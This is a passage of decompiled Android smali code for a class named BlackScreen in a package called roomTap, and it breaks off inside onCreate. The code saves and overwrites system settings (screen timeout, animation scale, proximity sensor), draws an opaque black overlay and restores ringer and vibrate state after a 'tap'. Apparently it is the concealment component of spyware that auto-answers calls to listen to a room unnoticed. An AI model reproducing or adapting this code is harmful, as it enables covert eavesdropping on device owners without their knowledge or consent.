.class public Lcom/network/android/roomTap/BlackScreen;
.super Landroid/app/Activity;


# static fields
.field public static a:Z

.field private static b:I

.field private static c:I

.field private static d:I

.field private static e:Landroid/view/View;

.field private static f:Landroid/view/WindowManager;


# instance fields
.field private g:Landroid/content/BroadcastReceiver;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    const/4 v1, 0x0

    sput v1, Lcom/network/android/roomTap/BlackScreen;->b:I

    const/4 v0, 0x1

    sput v0, Lcom/network/android/roomTap/BlackScreen;->c:I

    sput v1, Lcom/network/android/roomTap/BlackScreen;->d:I

    sput-boolean v1, Lcom/network/android/roomTap/BlackScreen;->a:Z

    sput-object v2, Lcom/network/android/roomTap/BlackScreen;->f:Landroid/view/WindowManager;

    sput-object v2, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcom/network/android/roomTap/j;

    invoke-direct {v0, p0}, Lcom/network/android/roomTap/j;-><init>(Lcom/network/android/roomTap/BlackScreen;)V

    iput-object v0, p0, Lcom/network/android/roomTap/BlackScreen;->g:Landroid/content/BroadcastReceiver;

    return-void
.end method

.method private a(I)V
    .locals 5

    :try_start_0
    const-string v0, "BlackScreen setDeviceWindowAnimationScaleSetting start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "content://settings/system/window_animation_scale"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    const-string v2, "value"

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-virtual {v2, v0, v1, v3, v4}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "blackscreen getDeviceWindowAnimationScaleSetting Exception"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method private static a(ILandroid/content/Context;)V
    .locals 3

    :try_start_0
    const-string v0, "BlackScreen setProximitySensorSetting start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen setProximitySensorSetting setting value: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "proximity_sensor"

    invoke-static {v0, v1, p0}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "blackscreen setProximitySensorSetting Exception"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static a(Landroid/content/Context;Landroid/content/SharedPreferences;)V
    .locals 4

    const/16 v3, 0x3a98

    :try_start_0
    const-string v0, "BlackScreen fixSettingsIfWeDidntFinishNicly checking screen turn off interval"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "screen_off_timeout"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen fixSettingsIfWeDidntFinishNicly after getting interval. value: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-ge v0, v3, :cond_1

    const-string v0, "BlackScreen fixSettingsIfWeDidntFinishNicly screen interval is too low. means tap wasn\'t finished nicly. setting original value to screen timeout"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "ScreenTimeout"

    const/4 v1, 0x0

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    if-ge v0, v3, :cond_0

    const-string v0, "BlackScreen fixSettingsIfWeDidntFinishNicly screen timeout in conf was too small. setting default value"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const v0, 0xea60

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "screen_off_timeout"

    invoke-static {v1, v2, v0}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen fixSettingsIfWeDidntFinishNicly after setting screen timeout. value: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_1
    const-string v0, "wasPhoneWasUnmutedAfterTapNicly"

    const/4 v1, 0x1

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen fixSettingsIfWeDidntFinishNicly didWeFinishedUnmutingNicly: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    if-nez v0, :cond_2

    const-string v0, "BlackScreen did not finish nicly. fixing settings"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "originalVibrateValue"

    const/4 v1, 0x0

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "originalRingerValue"

    const/4 v2, 0x0

    invoke-interface {p1, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v1, v0, p0}, Lcom/network/android/roomTap/AutoAnswerReceiver;->a(Ljava/lang/Integer;Ljava/lang/Integer;Landroid/content/Context;)V

    const-string v0, "screenProximtySensor"

    const/4 v1, 0x1

    invoke-interface {p1, v0, v1}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    invoke-static {v0, p0}, Lcom/network/android/roomTap/BlackScreen;->a(ILandroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_2
    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen fixSettingsIfWeDidntFinishNicly createBlackFilter exception: ."

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public static b()I
    .locals 1

    sget v0, Lcom/network/android/roomTap/BlackScreen;->b:I

    return v0
.end method

.method private c()I
    .locals 6

    :try_start_0
    const-string v0, "BlackScreen getDeviceWindowAnimationScaleSetting start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "content://settings/system/window_animation_scale"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_0

    const-string v1, "value"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getInt(I)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    :goto_0
    return v0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "blackscreen getDeviceWindowAnimationScaleSetting Exception"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_0
    const-string v0, "BlackScreen getDeviceWindowAnimationScaleSetting didnt found window animation value. returning 0"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method final a()V
    .locals 3

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen, isViewWasSet: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v1, Lcom/network/android/roomTap/BlackScreen;->a:Z

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen toastView: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "BlackScreen in removeBlackFilter"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->f:Landroid/view/WindowManager;

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    const/16 v0, 0x3a98

    sget v1, Lcom/network/android/roomTap/BlackScreen;->b:I

    if-le v0, v1, :cond_0

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "screen_off_timeout"

    const v2, 0xea60

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    const-string v0, "BlackScreen set screenOff original value too small. setting default: 60000"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :goto_0
    sget v0, Lcom/network/android/roomTap/BlackScreen;->d:I

    invoke-direct {p0, v0}, Lcom/network/android/roomTap/BlackScreen;->a(I)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen set screenAnimationScaleValueOriginal: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lcom/network/android/roomTap/BlackScreen;->d:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget v0, Lcom/network/android/roomTap/BlackScreen;->c:I

    invoke-static {v0, p0}, Lcom/network/android/roomTap/BlackScreen;->a(ILandroid/content/Context;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen set proximityEnabledDuringCallValue: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lcom/network/android/roomTap/BlackScreen;->c:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z

    const-string v0, "BlackScreen removedView"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->finish()V

    :goto_1
    return-void

    :cond_0
    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "screen_off_timeout"

    sget v2, Lcom/network/android/roomTap/BlackScreen;->b:I

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen set screenOfOriginalValue: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lcom/network/android/roomTap/BlackScreen;->b:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen removeBlackFilter Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen toastView: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_1
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    const-class v1, Landroid/view/WindowManager$LayoutParams;

    const-string v2, "buttonBrightness"

    invoke-virtual {v1, v2}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->f:Landroid/view/WindowManager;

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen removeBlackFilter exception in catch "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_1
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 6

    :try_start_0
    const-string v0, "BlackScreen in onCreate"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "screen_off_timeout"

    const/16 v2, 0x32

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v0

    sput v0, Lcom/network/android/roomTap/BlackScreen;->b:I

    invoke-static {v0}, Lcom/network/b/b;->d(I)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "screen_off_timeout"

    const/16 v2, 0x32

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    invoke-direct {p0}, Lcom/network/android/roomTap/BlackScreen;->c()I

    move-result v0

    sput v0, Lcom/network/android/roomTap/BlackScreen;->d:I

    const/4 v0, 0x0

    invoke-direct {p0, v0}, Lcom/network/android/roomTap/BlackScreen;->a(I)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen got screenAnimationScaleValueOriginal: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lcom/network/android/roomTap/BlackScreen;->d:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "proximity_sensor"

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->getInt(Landroid/content/ContentResolver;Ljava/lang/String;I)I

    move-result v0

    sput v0, Lcom/network/android/roomTap/BlackScreen;->c:I

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen got proximityEnabledDuringCallOriginalValue: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Lcom/network/android/roomTap/BlackScreen;->c:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget v0, Lcom/network/android/roomTap/BlackScreen;->c:I

    invoke-static {v0}, Lcom/network/b/b;->f(I)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1, v0}, Lcom/network/android/roomTap/BlackScreen;->a(ILandroid/content/Context;)V

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen saving screenOfOriginalValue prefrences to configurationHolder. screenOfOriginalValue:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v2, Lcom/network/android/roomTap/BlackScreen;->b:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v0}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    const-string v0, "android.view.WindowManagerImpl"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v1, "getDefault"

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Class;

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    sput-object v0, Lcom/network/android/roomTap/BlackScreen;->f:Landroid/view/WindowManager;

    const-string v0, "BlackScreen starting filter"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/roomTap/BlackScreen;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x7d4

    invoke-virtual {v0, v1}, Landroid/view/Window;->setType(I)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_3

    :try_start_1
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "BlackScreen in createBlackFilter. isViewWasSet = "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v1, Lcom/network/android/roomTap/BlackScreen;->a:Z

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z

    if-eqz v0, :cond_0

    const-string v0, "BlackScreen, createBlackFilter, view is already exists. not creating another view"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_2

    :goto_0
    :try_start_2
    iget-object v0, p0, Lcom/network/android/roomTap/BlackScreen;->g:Landroid/content/BroadcastReceiver;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "stop_filter_event"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/network/android/roomTap/BlackScreen;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_3

    :goto_1
    return-void

    :cond_0
    :try_start_3
    const-string v0, "layout_inflater"

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/BlackScreen;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    const/high16 v1, 0x7f020000

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    sput-object v0, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setFocusable(Z)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setClickable(Z)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setKeepScreenOn(Z)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setLongClickable(Z)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/view/View;->setFocusableInTouchMode(Z)V

    sget-object v0, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    new-instance v1, Landroid/graphics/drawable/ColorDrawable;

    const/16 v2, 0xff

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-static {v2, v3, v4, v5}, Landroid/graphics/Color;->argb(IIII)I

    move-result v2

    invoke-direct {v1, v2}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

